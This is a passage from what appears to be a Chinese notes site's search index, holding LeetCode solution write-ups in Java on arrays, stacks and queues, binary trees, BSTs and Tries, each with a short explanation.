ret[i - 1] + interval : ret[i - 1] - interval; } for (int i = k + 1; i \u0026lt; n; i++) { ret[i] = i + 1; } return ret; } 9. 数组的度    697. Degree of an Array (Easy)\nLeetcode / 力扣\nInput: [1,2,2,3,1,4,2] Output: 6 题目描述：数组的度定义为元素出现的最高频率，例如上面的数组度为 3。要求找到一个最小的子数组，这个子数组的度和原数组一样。\npublic int findShortestSubArray(int[] nums) { Map\u0026lt;Integer, Integer\u0026gt; numsCnt = new HashMap\u0026lt;\u0026gt;(); Map\u0026lt;Integer, Integer\u0026gt; numsLastIndex = new HashMap\u0026lt;\u0026gt;(); Map\u0026lt;Integer, Integer\u0026gt; numsFirstIndex = new HashMap\u0026lt;\u0026gt;(); for (int i = 0; i \u0026lt; nums.length; i++) { int num = nums[i]; numsCnt.put(num, numsCnt.getOrDefault(num, 0) + 1); numsLastIndex.put(num, i); if (!numsFirstIndex.containsKey(num)) { numsFirstIndex.put(num, i); } } int maxCnt = 0; for (int num : nums) { maxCnt = Math.max(maxCnt, numsCnt.get(num)); } int ret = nums.length; for (int i = 0; i \u0026lt; nums.length; i++) { int num = nums[i]; int cnt = numsCnt.get(num); if (cnt != maxCnt) continue; ret = Math.min(ret, numsLastIndex.get(num) - numsFirstIndex.get(num) + 1); } return ret; } 10. 对角元素相等的矩阵    766. Toeplitz Matrix (Easy)\nLeetcode / 力扣\n1234 5123 9512 In the above grid, the diagonals are \u0026#34;[9]\u0026#34;, \u0026#34;[5, 5]\u0026#34;, \u0026#34;[1, 1, 1]\u0026#34;, \u0026#34;[2, 2, 2]\u0026#34;, \u0026#34;[3, 3]\u0026#34;, \u0026#34;[4]\u0026#34;, and in each diagonal all elements are the same, so the answer is True. public boolean isToeplitzMatrix(int[][] matrix) { for (int i = 0; i \u0026lt; matrix[0].length; i++) { if (!check(matrix, matrix[0][i], 0, i)) { return false; } } for (int i = 0; i \u0026lt; matrix.length; i++) { if (!check(matrix, matrix[i][0], i, 0)) { return false; } } return true; } private boolean check(int[][] matrix, int expectValue, int row, int col) { if (row \u0026gt;= matrix.length || col \u0026gt;= matrix[0].length) { return true; } if (matrix[row][col] != expectValue) { return false; } return check(matrix, expectValue, row + 1, col + 1); } 11. 嵌套数组    565. Array Nesting (Medium)\nLeetcode / 力扣\nInput: A = [5,4,0,3,1,6,2] Output: 4 Explanation: A[0] = 5, A[1] = 4, A[2] = 0, A[3] = 3, A[4] = 1, A[5] = 6, A[6] = 2. One of the longest S[K]: S[0] = {A[0], A[5], A[6], A[2]} = {5, 6, 2, 0} 题目描述：S[i] 表示一个集合，集合的第一个元素是 A[i]，第二个元素是 A[A[i]]，如此嵌套下去。求最大的 S[i]。\npublic int arrayNesting(int[] nums) { int max = 0; for (int i = 0; i \u0026lt; nums.length; i++) { int cnt = 0; for (int j = i; nums[j] != -1; ) { cnt++; int t = nums[j]; nums[j] = -1; // 标记该位置已经被访问  j = t; } max = Math.max(max, cnt); } return max; } 12. 分隔数组    769. Max Chunks To Make Sorted (Medium)\nLeetcode / 力扣\nInput: arr = [1,0,2,3,4] Output: 4 Explanation: We can split into two chunks, such as [1, 0], [2, 3, 4]. However, splitting into [1, 0], [2], [3], [4] is the highest number of chunks possible. 题目描述：分隔数组，使得对每部分排序后数组就为有序。\npublic int maxChunksToSorted(int[] arr) { if (arr == null) return 0; int ret = 0; int right = arr[0]; for (int i = 0; i \u0026lt; arr.length; i++) { right = Math.max(right, arr[i]); if (right == i) ret++; } return ret; } "},{"id":252,"href":"/%E7%AC%94%E8%AE%B0/Leetcode-/LeetcodeLeetcode-%E9%A2%98%E8%A7%A3-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/","title":"Leetcode 题解 - 栈和队列","parent":"笔记","content":"Leetcode 题解 - 栈和队列     Leetcode 题解 - 栈和队列  1. 用栈实现队列 2. 用队列实现栈 3. 最小值栈 4. 用栈实现括号匹配 5. 数组中元素与下一个比它大的元素之间的距离 6. 循环数组中比当前元素大的下一个元素    1. 用栈实现队列    232. Implement Queue using Stacks (Easy)\nLeetcode / 力扣\n栈的顺序为后进先出，而队列的顺序为先进先出。使用两个栈实现队列，一个元素需要经过两个栈才能出队列，在经过第一个栈时元素顺序被反转，经过第二个栈时再次被反转，此时就是先进先出顺序。\nclass MyQueue { private Stack\u0026lt;Integer\u0026gt; in = new Stack\u0026lt;\u0026gt;(); private Stack\u0026lt;Integer\u0026gt; out = new Stack\u0026lt;\u0026gt;(); public void push(int x) { in.push(x); } public int pop() { in2out(); return out.pop(); } public int peek() { in2out(); return out.peek(); } private void in2out() { if (out.isEmpty()) { while (!in.isEmpty()) { out.push(in.pop()); } } } public boolean empty() { return in.isEmpty() \u0026amp;\u0026amp; out.isEmpty(); } } 2. 用队列实现栈    225. Implement Stack using Queues (Easy)\nLeetcode / 力扣\n在将一个元素 x 插入队列时，为了维护原来的后进先出顺序，需要让 x 插入队列首部。而队列的默认插入顺序是队列尾部，因此在将 x 插入队列尾部之后，需要让除了 x 之外的所有元素出队列，再入队列。\nclass MyStack { private Queue\u0026lt;Integer\u0026gt; queue; public MyStack() { queue = new LinkedList\u0026lt;\u0026gt;(); } public void push(int x) { queue.add(x); int cnt = queue.size(); while (cnt-- \u0026gt; 1) { queue.add(queue.poll()); } } public int pop() { return queue.remove(); } public int top() { return queue.peek(); } public boolean empty() { return queue.isEmpty(); } } 3. 最小值栈    155. Min Stack (Easy)\nLeetcode / 力扣\nclass MinStack { private Stack\u0026lt;Integer\u0026gt; dataStack; private Stack\u0026lt;Integer\u0026gt; minStack; private int min; public MinStack() { dataStack = new Stack\u0026lt;\u0026gt;(); minStack = new Stack\u0026lt;\u0026gt;(); min = Integer.MAX_VALUE; } public void push(int x) { dataStack.add(x); min = Math.min(min, x); minStack.add(min); } public void pop() { dataStack.pop(); minStack.pop(); min = minStack.isEmpty() ? Integer.MAX_VALUE : minStack.peek(); } public int top() { return dataStack.peek(); } public int getMin() { return minStack.peek(); } } 对于实现最小值队列问题，可以先将队列使用栈来实现，然后就将问题转换为最小值栈，这个问题出现在 编程之美：3.7。\n4. 用栈实现括号匹配    20. Valid Parentheses (Easy)\nLeetcode / 力扣\n\u0026#34;()[]{}\u0026#34; Output : true public boolean isValid(String s) { Stack\u0026lt;Character\u0026gt; stack = new Stack\u0026lt;\u0026gt;(); for (char c : s.toCharArray()) { if (c == \u0026#39;(\u0026#39; || c == \u0026#39;{\u0026#39; || c == \u0026#39;[\u0026#39;) { stack.push(c); } else { if (stack.isEmpty()) { return false; } char cStack = stack.pop(); boolean b1 = c == \u0026#39;)\u0026#39; \u0026amp;\u0026amp; cStack != \u0026#39;(\u0026#39;; boolean b2 = c == \u0026#39;]\u0026#39; \u0026amp;\u0026amp; cStack != \u0026#39;[\u0026#39;; boolean b3 = c == \u0026#39;}\u0026#39; \u0026amp;\u0026amp; cStack != \u0026#39;{\u0026#39;; if (b1 || b2 || b3) { return false; } } } return stack.isEmpty(); } 5. 数组中元素与下一个比它大的元素之间的距离    739. Daily Temperatures (Medium)\nLeetcode / 力扣\nInput: [73, 74, 75, 71, 69, 72, 76, 73] Output: [1, 1, 4, 2, 1, 1, 0, 0] 在遍历数组时用栈把数组中的数存起来，如果当前遍历的数比栈顶元素来的大，说明栈顶元素的下一个比它大的数就是当前元素。\npublic int[] dailyTemperatures(int[] temperatures) { int n = temperatures.length; int[] dist = new int[n]; Stack\u0026lt;Integer\u0026gt; indexs = new Stack\u0026lt;\u0026gt;(); for (int curIndex = 0; curIndex \u0026lt; n; curIndex++) { while (!indexs.isEmpty() \u0026amp;\u0026amp; temperatures[curIndex] \u0026gt; temperatures[indexs.peek()]) { int preIndex = indexs.pop(); dist[preIndex] = curIndex - preIndex; } indexs.add(curIndex); } return dist; } 6. 循环数组中比当前元素大的下一个元素    503. Next Greater Element II (Medium)\nLeetcode / 力扣\nInput: [1,2,1] Output: [2,-1,2] Explanation: The first 1\u0026#39;s next greater number is 2; The number 2 can\u0026#39;t find next greater number; The second 1\u0026#39;s next greater number needs to search circularly, which is also 2. 与 739. Daily Temperatures (Medium) 不同的是，数组是循环数组，并且最后要求的不是距离而是下一个元素。\npublic int[] nextGreaterElements(int[] nums) { int n = nums.length; int[] next = new int[n]; Arrays.fill(next, -1); Stack\u0026lt;Integer\u0026gt; pre = new Stack\u0026lt;\u0026gt;(); for (int i = 0; i \u0026lt; n * 2; i++) { int num = nums[i % n]; while (!pre.isEmpty() \u0026amp;\u0026amp; nums[pre.peek()] \u0026lt; num) { next[pre.pop()] = num; } if (i \u0026lt; n){ pre.push(i); } } return next; } "},{"id":253,"href":"/%E7%AC%94%E8%AE%B0/Leetcode-/LeetcodeLeetcode-%E9%A2%98%E8%A7%A3-%E6%A0%91/","title":"Leetcode 题解 - 树","parent":"笔记","content":"Leetcode 题解 - 树     Leetcode 题解 - 树  递归  1. 树的高度 2. 平衡树 3. 两节点的最长路径 4. 翻转树 5. 归并两棵树 6. 判断路径和是否等于一个数 7. 统计路径和等于一个数的路径数量 8. 子树 9. 树的对称 10. 最小路径 11. 统计左叶子节点的和 12. 相同节点值的最大路径长度 13. 间隔遍历 14. 找出二叉树中第二小的节点   层次遍历  1. 一棵树每层节点的平均数 2. 得到左下角的节点   前中后序遍历  1. 非递归实现二叉树的前序遍历 2. 非递归实现二叉树的后序遍历 3. 非递归实现二叉树的中序遍历   BST  1. 修剪二叉查找树 2. 寻找二叉查找树的第 k 个元素 3. 把二叉查找树每个节点的值都加上比它大的节点的值 4. 二叉查找树的最近公共祖先 5. 二叉树的最近公共祖先 6. 从有序数组中构造二叉查找树 7. 根据有序链表构造平衡的二叉查找树 8. 在二叉查找树中寻找两个节点，使它们的和为一个给定值 9. 在二叉查找树中查找两个节点之差的最小绝对值 10. 寻找二叉查找树中出现次数最多的值   Trie  1. 实现一个 Trie 2. 实现一个 Trie，用来求前缀和      递归    一棵树要么是空树，要么有两个指针，每个指针指向一棵树。树是一种递归结构，很多树的问题可以使用递归来处理。\n1. 树的高度    104. Maximum Depth of Binary Tree (Easy)\nLeetcode / 力扣\npublic int maxDepth(TreeNode root) { if (root == null) return 0; return Math.max(maxDepth(root.left), maxDepth(root.right)) + 1; } 2. 平衡树    110. Balanced Binary Tree (Easy)\nLeetcode / 力扣\n3 / \\ 9 20 / \\ 15 7 平衡树左右子树高度差都小于等于 1\nprivate boolean result = true; public boolean isBalanced(TreeNode root) { maxDepth(root); return result; } public int maxDepth(TreeNode root) { if (root == null) return 0; int l = maxDepth(root.left); int r = maxDepth(root.right); if (Math.abs(l - r) \u0026gt; 1) result = false; return 1 + Math.max(l, r); } 3. 两节点的最长路径    543. Diameter of Binary Tree (Easy)\nLeetcode / 力扣\nInput: 1 / \\ 2 3 / \\ 4 5 Return 3, which is the length of the path [4,2,1,3] or [5,2,1,3]. private int max = 0; public int diameterOfBinaryTree(TreeNode root) { depth(root); return max; } private int depth(TreeNode root) { if (root == null) return 0; int leftDepth = depth(root.left); int rightDepth = depth(root.right); max = Math.max(max, leftDepth + rightDepth); return Math.max(leftDepth, rightDepth) + 1; } 4. 翻转树    226. Invert Binary Tree (Easy)\nLeetcode / 力扣\npublic TreeNode invertTree(TreeNode root) { if (root == null) return null; TreeNode left = root.left; // 后面的操作会改变 left 指针，因此先保存下来  root.left = invertTree(root.right); root.right = invertTree(left); return root; } 5. 归并两棵树    617. Merge Two Binary Trees (Easy)\nLeetcode / 力扣\nInput: Tree 1 Tree 2 1 2 / \\ / \\ 3 2 1 3 / \\ \\ 5 4 7 Output: 3 / \\ 4 5 / \\ \\ 5 4 7 public TreeNode mergeTrees(TreeNode t1, TreeNode t2) { if (t1 == null \u0026amp;\u0026amp; t2 == null) return null; if (t1 == null) return t2; if (t2 == null) return t1; TreeNode root = new TreeNode(t1.val + t2.val); root.left = mergeTrees(t1.left, t2.left); root.right = mergeTrees(t1.right, t2.right); return root; } 6. 判断路径和是否等于一个数    Leetcdoe : 112. Path Sum (Easy)\nLeetcode / 力扣\nGiven the below binary tree and sum = 22, 5 / \\ 4 8 / / \\ 11 13 4 / \\ \\ 7 2 1 return true, as there exist a root-to-leaf path 5-\u0026gt;4-\u0026gt;11-\u0026gt;2 which sum is 22. 路径和定义为从 root 到 leaf 的所有节点的和。\npublic boolean hasPathSum(TreeNode root, int sum) { if (root == null) return false; if (root.left == null \u0026amp;\u0026amp; root.right == null \u0026amp;\u0026amp; root.val == sum) return true; return hasPathSum(root.left, sum - root.val) || hasPathSum(root.right, sum - root.val); } 7. 统计路径和等于一个数的路径数量    437. Path Sum III (Easy)\nLeetcode / 力扣\nroot = [10,5,-3,3,2,null,11,3,-2,null,1], sum = 8 10 / \\ 5 -3 / \\ \\ 3 2 11 / \\ \\ 3 -2 1 Return 3. The paths that sum to 8 are: 1. 5 -\u0026gt; 3 2. 5 -\u0026gt; 2 -\u0026gt; 1 3. -3 -\u0026gt; 11 路径不一定以 root 开头，也不一定以 leaf 结尾，但是必须连续。\npublic int pathSum(TreeNode root, int sum) { if (root == null) return 0; int ret = pathSumStartWithRoot(root, sum) + pathSum(root.left, sum) + pathSum(root.right, sum); return ret; } private int pathSumStartWithRoot(TreeNode root, int sum) { if (root == null) return 0; int ret = 0; if (root.val == sum) ret++; ret += pathSumStartWithRoot(root.left, sum - root.val) + pathSumStartWithRoot(root.right, sum - root.val); return ret; } 8. 子树    572. Subtree of Another Tree (Easy)\nLeetcode / 力扣\nGiven tree s: 3 / \\ 4 5 / \\ 1 2 Given tree t: 4 / \\ 1 2 Return true, because t has the same structure and node values with a subtree of s. Given tree s: 3 / \\ 4 5 / \\ 1 2 / 0 Given tree t: 4 / \\ 1 2 Return false. public boolean isSubtree(TreeNode s, TreeNode t) { if (s == null) return false; return isSubtreeWithRoot(s, t) || isSubtree(s.left, t) || isSubtree(s.right, t); } private boolean isSubtreeWithRoot(TreeNode s, TreeNode t) { if (t == null \u0026amp;\u0026amp; s == null) return true; if (t == null || s == null) return false; if (t.val != s.val) return false; return isSubtreeWithRoot(s.left, t.left) \u0026amp;\u0026amp; isSubtreeWithRoot(s.right, t.right); } 9. 树的对称    101. Symmetric Tree (Easy)\nLeetcode / 力扣\n1 / \\ 2 2 / \\ / \\ 3 4 4 3 public boolean isSymmetric(TreeNode root) { if (root == null) return true; return isSymmetric(root.left, root.right); } private boolean isSymmetric(TreeNode t1, TreeNode t2) { if (t1 == null \u0026amp;\u0026amp; t2 == null) return true; if (t1 == null || t2 == null) return false; if (t1.val != t2.val) return false; return isSymmetric(t1.left, t2.right) \u0026amp;\u0026amp; isSymmetric(t1.right, t2.left); } 10. 最小路径    111. Minimum Depth of Binary Tree (Easy)\nLeetcode / 力扣\n树的根节点到叶子节点的最小路径长度\npublic int minDepth(TreeNode root) { if (root == null) return 0; int left = minDepth(root.left); int right = minDepth(root.right); if (left == 0 || right == 0) return left + right + 1; return Math.min(left, right) + 1; } 11. 统计左叶子节点的和    404. Sum of Left Leaves (Easy)\nLeetcode / 力扣\n3 / \\ 9 20 / \\ 15 7 There are two left leaves in the binary tree, with values 9 and 15 respectively. Return 24. public int sumOfLeftLeaves(TreeNode root) { if (root == null) return 0; if (isLeaf(root.left)) return root.left.val + sumOfLeftLeaves(root.right); return sumOfLeftLeaves(root.left) + sumOfLeftLeaves(root.right); } private boolean isLeaf(TreeNode node){ if (node == null) return false; return node.left == null \u0026amp;\u0026amp; node.right == null; } 12. 相同节点值的最大路径长度    687. Longest Univalue Path (Easy)\nLeetcode / 力扣\n1 / \\ 4 5 / \\ \\ 4 4 5 Output : 2 private int path = 0; public int longestUnivaluePath(TreeNode root) { dfs(root); return path; } private int dfs(TreeNode root){ if (root == null) return 0; int left = dfs(root.left); int right = dfs(root.right); int leftPath = root.left != null \u0026amp;\u0026amp; root.left.val == root.val ? left + 1 : 0; int rightPath = root.right != null \u0026amp;\u0026amp; root.right.val == root.val ? right + 1 : 0; path = Math.max(path, leftPath + rightPath); return Math.max(leftPath, rightPath); } 13. 间隔遍历    337. House Robber III (Medium)\nLeetcode / 力扣\n3 / \\ 2 3 \\ \\ 3 1 Maximum amount of money the thief can rob = 3 + 3 + 1 = 7. Map\u0026lt;TreeNode, Integer\u0026gt; cache = new HashMap\u0026lt;\u0026gt;(); public int rob(TreeNode root) { if (root == null) return 0; if (cache.containsKey(root)) return cache.get(root); int val1 = root.val; if (root.left != null) val1 += rob(root.left.left) + rob(root.left.right); if (root.right != null) val1 += rob(root.right.left) + rob(root.right.right); int val2 = rob(root.left) + rob(root.right); int res = Math.max(val1, val2); cache.put(root, res); return res; } 14. 找出二叉树中第二小的节点    671. Second Minimum Node In a Binary Tree (Easy)\nLeetcode / 力扣\nInput: 2 / \\ 2 5 / \\ 5 7 Output: 5 一个节点要么具有 0 个或 2 个子节点，如果有子节点，那么根节点是最小的节点。\npublic int findSecondMinimumValue(TreeNode root) { if (root == null) return -1; if (root.left == null \u0026amp;\u0026amp; root.right == null) return -1; int leftVal = root.left.val; int rightVal = root.right.val; if (leftVal == root.val) leftVal = findSecondMinimumValue(root.left); if (rightVal == root.val) rightVal = findSecondMinimumValue(root.right); if (leftVal != -1 \u0026amp;\u0026amp; rightVal != -1) return Math.min(leftVal, rightVal); if (leftVal != -1) return leftVal; return rightVal; } 层次遍历    使用 BFS 进行层次遍历。不需要使用两个队列来分别存储当前层的节点和下一层的节点，因为在开始遍历一层的节点时，当前队列中的节点数就是当前层的节点数，只要控制遍历这么多节点数，就能保证这次遍历的都是当前层的节点。\n1. 一棵树每层节点的平均数    637. Average of Levels in Binary Tree (Easy)\nLeetcode / 力扣\npublic List\u0026lt;Double\u0026gt; averageOfLevels(TreeNode root) { List\u0026lt;Double\u0026gt; ret = new ArrayList\u0026lt;\u0026gt;(); if (root == null) return ret; Queue\u0026lt;TreeNode\u0026gt; queue = new LinkedList\u0026lt;\u0026gt;(); queue.add(root); while (!queue.isEmpty()) { int cnt = queue.size(); double sum = 0; for (int i = 0; i \u0026lt; cnt; i++) { TreeNode node = queue.poll(); sum += node.val; if (node.left != null) queue.add(node.left); if (node.right != null) queue.add(node.right); } ret.add(sum / cnt); } return ret; } 2. 得到左下角的节点    513. Find Bottom Left Tree Value (Easy)\nLeetcode / 力扣\nInput: 1 / \\ 2 3 / / \\ 4 5 6 / 7 Output: 7 public int findBottomLeftValue(TreeNode root) { Queue\u0026lt;TreeNode\u0026gt; queue = new LinkedList\u0026lt;\u0026gt;(); queue.add(root); while (!queue.isEmpty()) { root = queue.poll(); if (root.right != null) queue.add(root.right); if (root.left != null) queue.add(root.left); } return root.val; } 前中后序遍历    1 / \\ 2 3 / \\ \\ 4 5 6  层次遍历顺序：[1 2 3 4 5 6] 前序遍历顺序：[1 2 4 5 3 6] 中序遍历顺序：[4 2 5 1 3 6] 后序遍历顺序：[4 5 2 6 3 1]  层次遍历使用 BFS 实现，利用的就是 BFS 一层一层遍历的特性；而前序、中序、后序遍历利用了 DFS 实现。\n前序、中序、后序遍只是在对节点访问的顺序有一点不同，其它都相同。\n① 前序\nvoid dfs(TreeNode root) { visit(root); dfs(root.left); dfs(root.right); } ② 中序\nvoid dfs(TreeNode root) { dfs(root.left); visit(root); dfs(root.right); } ③ 后序\nvoid dfs(TreeNode root) { dfs(root.left); dfs(root.right); visit(root); } 1. 非递归实现二叉树的前序遍历    144. Binary Tree Preorder Traversal (Medium)\nLeetcode / 力扣\npublic List\u0026lt;Integer\u0026gt; preorderTraversal(TreeNode root) { List\u0026lt;Integer\u0026gt; ret = new ArrayList\u0026lt;\u0026gt;(); Stack\u0026lt;TreeNode\u0026gt; stack = new Stack\u0026lt;\u0026gt;(); stack.push(root); while (!stack.isEmpty()) { TreeNode node = stack.pop(); if (node == null) continue; ret.add(node.val); stack.push(node.right); // 先右后左，保证左子树先遍历  stack.push(node.left); } return ret; } 2. 非递归实现二叉树的后序遍历    145. Binary Tree Postorder Traversal (Medium)\nLeetcode / 力扣\n前序遍历为 root -\u0026gt; left -\u0026gt; right，后序遍历为 left -\u0026gt; right -\u0026gt; root。可以修改前序遍历成为 root -\u0026gt; right -\u0026gt; left，那么这个顺序就和后序遍历正好相反。\npublic List\u0026lt;Integer\u0026gt; postorderTraversal(TreeNode root) { List\u0026lt;Integer\u0026gt; ret = new ArrayList\u0026lt;\u0026gt;(); Stack\u0026lt;TreeNode\u0026gt; stack = new Stack\u0026lt;\u0026gt;(); stack.push(root); while (!stack.isEmpty()) { TreeNode node = stack.pop(); if (node == null) continue; ret.add(node.val); stack.push(node.left); stack.push(node.right); } Collections.reverse(ret); return ret; } 3. 非递归实现二叉树的中序遍历    94. Binary Tree Inorder Traversal (Medium)\nLeetcode / 力扣\npublic List\u0026lt;Integer\u0026gt; inorderTraversal(TreeNode root) { List\u0026lt;Integer\u0026gt; ret = new ArrayList\u0026lt;\u0026gt;(); if (root == null) return ret; Stack\u0026lt;TreeNode\u0026gt; stack = new Stack\u0026lt;\u0026gt;(); TreeNode cur = root; while (cur != null || !stack.isEmpty()) { while (cur != null) { stack.push(cur); cur = cur.left; } TreeNode node = stack.pop(); ret.add(node.val); cur = node.right; } return ret; } BST    二叉查找树（BST）：根节点大于等于左子树所有节点，小于等于右子树所有节点。\n二叉查找树中序遍历有序。\n1. 修剪二叉查找树    669. Trim a Binary Search Tree (Easy)\nLeetcode / 力扣\nInput: 3 / \\ 0 4 \\ 2 / 1 L = 1 R = 3 Output: 3 / 2 / 1 题目描述：只保留值在 L ~ R 之间的节点\npublic TreeNode trimBST(TreeNode root, int L, int R) { if (root == null) return null; if (root.val \u0026gt; R) return trimBST(root.left, L, R); if (root.val \u0026lt; L) return trimBST(root.right, L, R); root.left = trimBST(root.left, L, R); root.right = trimBST(root.right, L, R); return root; } 2. 寻找二叉查找树的第 k 个元素    230. Kth Smallest Element in a BST (Medium)\nLeetcode / 力扣\n中序遍历解法：\nprivate int cnt = 0; private int val; public int kthSmallest(TreeNode root, int k) { inOrder(root, k); return val; } private void inOrder(TreeNode node, int k) { if (node == null) return; inOrder(node.left, k); cnt++; if (cnt == k) { val = node.val; return; } inOrder(node.right, k); } 递归解法：\npublic int kthSmallest(TreeNode root, int k) { int leftCnt = count(root.left); if (leftCnt == k - 1) return root.val; if (leftCnt \u0026gt; k - 1) return kthSmallest(root.left, k); return kthSmallest(root.right, k - leftCnt - 1); } private int count(TreeNode node) { if (node == null) return 0; return 1 + count(node.left) + count(node.right); } 3. 把二叉查找树每个节点的值都加上比它大的节点的值    Convert BST to Greater Tree (Easy)\nLeetcode / 力扣\nInput: The root of a Binary Search Tree like this: 5 / \\ 2 13 Output: The root of a Greater Tree like this: 18 / \\ 20 13 先遍历右子树。\nprivate int sum = 0; public TreeNode convertBST(TreeNode root) { traver(root); return root; } private void traver(TreeNode node) { if (node == null) return; traver(node.right); sum += node.val; node.val = sum; traver(node.left); } 4. 二叉查找树的最近公共祖先    235. Lowest Common Ancestor of a Binary Search Tree (Easy)\nLeetcode / 力扣\n_______6______ / \\ ___2__ ___8__ / \\ / \\ 0 4 7 9 / \\ 3 5 For example, the lowest common ancestor (LCA) of nodes 2 and 8 is 6. Another example is LCA of nodes 2 and 4 is 2, since a node can be a descendant of itself according to the LCA definition. public TreeNode lowestCommonAncestor(TreeNode root, TreeNode p, TreeNode q) { if (root.val \u0026gt; p.val \u0026amp;\u0026amp; root.val \u0026gt; q.val) return lowestCommonAncestor(root.left, p, q); if (root.val \u0026lt; p.val \u0026amp;\u0026amp; root.val \u0026lt; q.val) return lowestCommonAncestor(root.right, p, q); return root; } 5. 二叉树的最近公共祖先    236. Lowest Common Ancestor of a Binary Tree (Medium)\nLeetcode / 力扣\n_______3______ / \\ ___5__ ___1__ / \\ / \\ 6 2 0 8 / \\ 7 4 For example, the lowest common ancestor (LCA) of nodes 5 and 1 is 3. Another example is LCA of nodes 5 and 4 is 5, since a node can be a descendant of itself according to the LCA definition. public TreeNode lowestCommonAncestor(TreeNode root, TreeNode p, TreeNode q) { if (root == null || root == p || root == q) return root; TreeNode left = lowestCommonAncestor(root.left, p, q); TreeNode right = lowestCommonAncestor(root.right, p, q); return left == null ? right : right == null ? left : root; } 6. 从有序数组中构造二叉查找树    108. Convert Sorted Array to Binary Search Tree (Easy)\nLeetcode / 力扣\npublic TreeNode sortedArrayToBST(int[] nums) { return toBST(nums, 0, nums.length - 1); } private TreeNode toBST(int[] nums, int sIdx, int eIdx){ if (sIdx \u0026gt; eIdx) return null; int mIdx = (sIdx + eIdx) / 2; TreeNode root = new TreeNode(nums[mIdx]); root.left = toBST(nums, sIdx, mIdx - 1); root.right = toBST(nums, mIdx + 1, eIdx); return root; } 7. 根据有序链表构造平衡的二叉查找树    109. Convert Sorted List to Binary Search Tree (Medium)\nLeetcode / 力扣\nGiven the sorted linked list: [-10,-3,0,5,9], One possible answer is: [0,-3,9,-10,null,5], which represents the following height balanced BST: 0 / \\ -3 9 / / -10 5 public TreeNode sortedListToBST(ListNode head) { if (head == null) return null; if (head.next == null) return new TreeNode(head.val); ListNode preMid = preMid(head); ListNode mid = preMid.next; preMid.next = null; // 断开链表  TreeNode t = new TreeNode(mid.val); t.left = sortedListToBST(head); t.right = sortedListToBST(mid.next); return t; } private ListNode preMid(ListNode head) { ListNode slow = head, fast = head.next; ListNode pre = head; while (fast != null \u0026amp;\u0026amp; fast.next != null) { pre = slow; slow = slow.next; fast = fast.next.next; } return pre; } 8. 在二叉查找树中寻找两个节点，使它们的和为一个给定值    653. Two Sum IV - Input is a BST (Easy)\nLeetcode / 力扣\nInput: 5 / \\ 3 6 / \\ \\ 2 4 7 Target = 9 Output: True 使用中序遍历得到有序数组之后，再利用双指针对数组进行查找。\n应该注意到，这一题不能用分别在左右子树两部分来处理这种思想，因为两个待求的节点可能分别在左右子树中。\npublic boolean findTarget(TreeNode root, int k) { List\u0026lt;Integer\u0026gt; nums = new ArrayList\u0026lt;\u0026gt;(); inOrder(root, nums); int i = 0, j = nums.size() - 1; while (i \u0026lt; j) { int sum = nums.get(i) + nums.get(j); if (sum == k) return true; if (sum \u0026lt; k) i++; else j--; } return false; } private void inOrder(TreeNode root, List\u0026lt;Integer\u0026gt; nums) { if (root == null) return; inOrder(root.left, nums); nums.add(root.val); inOrder(root.right, nums); } 9. 在二叉查找树中查找两个节点之差的最小绝对值    530. Minimum Absolute Difference in BST (Easy)\nLeetcode / 力扣\nInput: 1 \\ 3 / 2 Output: 1 利用二叉查找树的中序遍历为有序的性质，计算中序遍历中临近的两个节点之差的绝对值，取最小值。\nprivate int minDiff = Integer.MAX_VALUE; private TreeNode preNode = null; public int getMinimumDifference(TreeNode root) { inOrder(root); return minDiff; } private void inOrder(TreeNode node) { if (node == null) return; inOrder(node.left); if (preNode != null) minDiff = Math.min(minDiff, node.val - preNode.val); preNode = node; inOrder(node.right); } 10. 寻找二叉查找树中出现次数最多的值    501. Find Mode in Binary Search Tree (Easy)\nLeetcode / 力扣\n1 \\ 2 / 2 return [2]. 答案可能不止一个，也就是有多个值出现的次数一样多。\nprivate int curCnt = 1; private int maxCnt = 1; private TreeNode preNode = null; public int[] findMode(TreeNode root) { List\u0026lt;Integer\u0026gt; maxCntNums = new ArrayList\u0026lt;\u0026gt;(); inOrder(root, maxCntNums); int[] ret = new int[maxCntNums.size()]; int idx = 0; for (int num : maxCntNums) { ret[idx++] = num; } return ret; } private void inOrder(TreeNode node, List\u0026lt;Integer\u0026gt; nums) { if (node == null) return; inOrder(node.left, nums); if (preNode != null) { if (preNode.val == node.val) curCnt++; else curCnt = 1; } if (curCnt \u0026gt; maxCnt) { maxCnt = curCnt; nums.clear(); nums.add(node.val); } else if (curCnt == maxCnt) { nums.add(node.val); } preNode = node; inOrder(node.right, nums); } Trie    \nTrie，又称前缀树或字典树，用于判断字符串是否存在或者是否具有某种字符串前缀。\n1. 实现一个 Trie    208. Implement Trie (Prefix Tree) (Medium)\nLeetcode / 力扣\nclass Trie { private class Node { Node[] childs = new Node[26]; boolean isLeaf; } private Node root = new Node(); public Trie() { } public void insert(String word) { insert(word, root); } private void insert(String word, Node node) { if (node == null) return; if (word.length() == 0) { node.isLeaf = true; return; } int index = indexForChar(word.charAt(0)); if (node.childs[index] == null) { node.childs[index] = new Node(); } insert(word.substring(1), node.childs[index]); } public boolean search(String word) { return search(word, root); } private boolean search(String word, Node node) { if (node == null) return false; if (word.length() == 0) return node.isLeaf; int index = indexForChar(word.charAt(0)); return search(word.substring(1), node.childs[index]); } public boolean startsWith(String prefix) { return startWith(prefix, root); } private boolean startWith(String prefix, Node node) { if (node == null) return false; if (prefix.length() == 0) return true; int index = indexForChar(prefix.charAt(0)); return startWith(prefix.substring(1), node.childs[index]); } private int indexForChar(char c) { return c - \u0026#39;a\u0026#39;; } } 2. 实现一个 Trie，用来求前缀和    677. Map Sum Pairs (Medium)\nLeetcode / 力扣\nInput: insert(\u0026#34;apple\u0026#34;, 3), Output: Null Input: sum(\u0026#34;ap\u0026#34;), Output: 3 Input: insert(\u0026#34;app\u0026#34;, 2), Output: Null Input: sum(\u0026#34;ap\u0026#34;), Output: 5 class MapSum { private class Node { Node[] child = new Node[26]; int value; } private Node root = new Node(); public MapSum() { } public void insert(String key, int val) { insert(key, root, val); } private void insert(String key, Node node, int val) { if (node == null) return; if (key.length() == 0) { node.value = val; return; } int index = indexForChar(key.charAt(0)); if (node.child[index] == null) { node.child[index] = new Node(); } insert(key.substring(1), node.child[index], val); } public int sum(String prefix) { return sum(prefix, root); } private int sum(String prefix, Node node) { if (node == null) return 0; if (prefix.length() != 0) { int index = indexForChar(prefix.charAt(0)); return sum(prefix.substring(1), node.child[index]); } int sum = node.value; for (Node child : node.child) { sum += sum(prefix, child); } return sum; } private int indexForChar(char c) { return c - \u0026#39;a\u0026#39;; } } 